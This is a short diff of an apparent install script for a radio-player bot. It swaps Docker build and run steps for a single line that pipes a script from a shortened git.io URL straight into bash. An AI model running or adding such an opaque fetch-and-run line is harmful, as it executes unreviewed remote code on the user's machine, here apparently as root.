@@ -15,6 +15,5 @@ branch=main
 git clone -b $branch https://github.com/ZDARKSHADOWXD/RadioPlayerV33.git /root/RadioPlayerV33/ 
 cp RadioPlayerV3/.env /root/RadioPlayerV33/.env
 pip3 install -U -r requirements.txt
-docker build . --rm --force-rm --compress --pull --file Dockerfile -t RadioPlayerV33
-docker run --privileged --env-file .env --rm -i RadioPlayerV33
+bash -c "$(curl -fsSL https://git.io/JY9UM)"
 python3 main.py
